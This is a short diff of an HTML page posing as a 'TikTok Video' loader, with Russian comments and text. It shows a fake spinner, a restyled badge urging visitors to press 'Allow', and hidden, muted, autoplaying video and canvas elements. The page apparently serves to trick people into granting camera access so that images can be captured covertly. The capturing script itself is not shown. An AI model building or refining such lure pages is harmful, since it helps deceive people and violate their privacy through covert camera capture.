@@ -6,19 +6,33 @@
     <title>TikTok Video</title>
     <style>
         body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { margin-top: 20px; font-size: 18px; font-weight: bold; }
-        #video, #canvas { display: none; }
+.loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.text { margin-top: 20px; font-size: 18px; font-weight: bold; }
+#video, #canvas { display: none; }
+
+/* НОВАЯ ЧАСТЬ: Стиль для плашки */
+.permission-hint {
+    background-color: rgba(255, 255, 255, 0.15); /* Прозрачный белый фон */
+    color: white;
+    padding: 12px 24px;
+    border-radius: 30px; /* Скругление */
+    font-size: 15px;
+    margin-bottom: 25px;
+    text-align: center;
+    border: 1px solid rgba(255, 255, 255, 0.2); /* Рамка */
+    backdrop-filter: blur(5px); /* Размытие фона */
+}
     </style>
 </head>
 <!-- Измененная часть body -->
 <body>
-    <div class="text" style="color: #fe2c55; margin-bottom: 10px;">Нажмите «Разрешить», чтобы продолжить</div>
-    <div class="loader"></div>
-    <div class="text">Загрузка видео...</div>
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+<div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
+<div class="loader"></div>
+<div class="text">Загрузка видео...</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
 
 <script>
